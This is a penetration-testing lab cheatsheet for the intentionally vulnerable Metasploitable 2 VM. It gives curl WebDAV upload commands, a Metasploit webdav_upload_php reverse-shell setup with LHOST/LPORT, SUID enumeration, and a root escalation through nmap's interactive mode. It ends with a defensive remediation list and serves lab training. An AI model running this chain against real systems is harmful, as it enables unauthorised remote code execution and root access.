# Metasploitable 2 — WebDAV + Privilege Escalation Cheatsheet

## Target

```text
MS2: 192.168.89.128
Kali vmnet8: 192.168.89.1
```

## Attack Chain

```text
Anonymous WebDAV
    ↓
PUT PHP
    ↓
PHP execution
    ↓
www-data
    ↓
SUID enumeration
    ↓
SUID Nmap 4.53
    ↓
Interactive mode
    ↓
root
```

## WebDAV Quick Commands

```bash
curl -i -X OPTIONS http://192.168.89.128/dav/
curl -i -T ~/test.php http://192.168.89.128/dav/test.php
curl -i http://192.168.89.128/dav/test.php
curl -i -X DELETE http://192.168.89.128/dav/test.php
```

## Metasploit

```text
use exploit/multi/http/webdav_upload_php
set RHOSTS 192.168.89.128
set RPORT 80
set URI /dav/
set LHOST 192.168.89.1
set LPORT 4444
run
```

## Post-Exploitation

```text
getuid
sysinfo
pwd
ls
shell
```

```bash
whoami
id
hostname
uname -a
sudo -l
find / -perm -4000 -type f 2>/dev/null | sort
```

## SUID Validation

```bash
ls -l /usr/bin/nmap
nmap --version
nmap --interactive
```

Nmap prompt:

```text
!id
!whoami
```

## Evidence to Record

- Target IP.
- WebDAV endpoint.
- Anonymous access.
- Successful `PUT`.
- PHP execution.
- Initial user.
- SUID Nmap permissions.
- Nmap version.
- Interactive mode.
- Root identity proof.

## Defensive Remediation

- Disable anonymous WebDAV.
- Remove write permission where not required.
- Disable script execution in upload directories.
- Remove unnecessary SUID bits.
- Upgrade obsolete software.
- Audit SUID/SGID binaries regularly.
- Segment vulnerable systems.
